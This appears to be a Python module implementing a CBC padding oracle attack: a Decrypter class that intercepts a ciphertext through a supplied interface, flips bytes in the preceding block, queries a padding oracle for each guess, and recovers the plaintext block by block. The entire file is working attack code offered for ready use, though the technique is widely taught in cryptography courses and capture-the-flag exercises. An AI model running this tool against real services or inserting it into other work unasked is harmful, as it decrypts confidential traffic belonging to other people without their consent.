def remove_padding(plaintext):
    """ This function removes A VALID(!) PKCS#7 padding.

    Args:
        plaintext (bytes): PKCS#7 padded data
    """
    return plaintext[:-plaintext[-1]]

class Decrypter:
    def __init__(self, blocksize, interface, verbose=False):
        self.blocksize = blocksize
        self.interface = interface
        self.verbose = verbose

    def _crack_position(self, blocks, position, pad):
        for byte in ([i for i in range(256) if i != pad] + [pad]):
            b = blocks.copy()
            self._patch_byte(b, position, byte ^ pad)

            if self.interface.oracle(b''.join(b)):
                return byte

        raise Exception("cant decrypt byte at position {0}".format(position))

    def _chunking(self, p):
        """ This function splits a bunch of data into blocks of fixed
        blocksize length and returns a list of the chunks.

        Args:
            p (bytes): the payload
        """

        return [p[i:(i+self.blocksize)] for i in range(0, len(p), self.blocksize)]

    def _patch_byte(self, blocks, position, patch):
        """ The patch gets xor'd to blocks[-2] where the actual value gets
        added too. For example: if you want to crack the last byte of the last
        block you want to manipulate the last byte of blocks[-2] and you have
        to call that function like: self._patch_byte(blocks, 16, value ^ 0x01)
        """

        b, p = blocks, position - 1
        b[-2] = b[-2][:p] + bytes([b[-2][p] ^ patch]) + b[-2][(p + 1):]
        return b

    def _reveal_last_block(self, message):
        """ This function uses the padding oracle to crack the last block of the
        message. It returns the plaintext of the last block.

        Args:
            message (bytes): the message of which the last block should be cracked
        """

        plainblock = b''
        original_blocks = self._chunking(message)

        for counter in range(1, self.blocksize + 1):
            blocks = original_blocks.copy()

            # adjusting blocks for new cycle:
            for i, value in enumerate(reversed(plainblock)):
                self._patch_byte(blocks, self.blocksize - i, counter ^ value)

            result = self._crack_position(blocks, self.blocksize - counter + 1, counter)
            plainblock = bytes([result]) + plainblock

        return plainblock

    def attack(self, message):
        """ This function decrypts an intercepted message by using the padding
        oracle defined in the given interface (except the first block, which
        can't be decrypted without controle over crypto IV.

        Args:
            message (bytes): the intercepted message
        """

        plaintext = b''

        if len(message) % self.blocksize != 0:
            raise Exception("message has to be a valid length")

        while len(message) > self.blocksize:
            plaintext = self._reveal_last_block(message) + plaintext

            if self.verbose:
                print("[+] revealed block:", plaintext)

            # cut last block. we have already decrypted it :)
            message = message[:-self.blocksize]

        return plaintext

    def run(self, remove_pad=True):
        """ This function serves the convenient way to use this padding oracle
        attack implementation. You just define in __init__ a proper interface
        and run this function. It returns the plaintext of the returned message
        of the interception function.

        Args:
            remove_pad (bool): Set true if and only if you would like to get
                               the PKCS#7 padding removed.
        """

        message = self.interface.intercept()
        plaintext = self.attack(message)

        if remove_pad:
            plaintext = remove_padding(plaintext)

        return plaintext

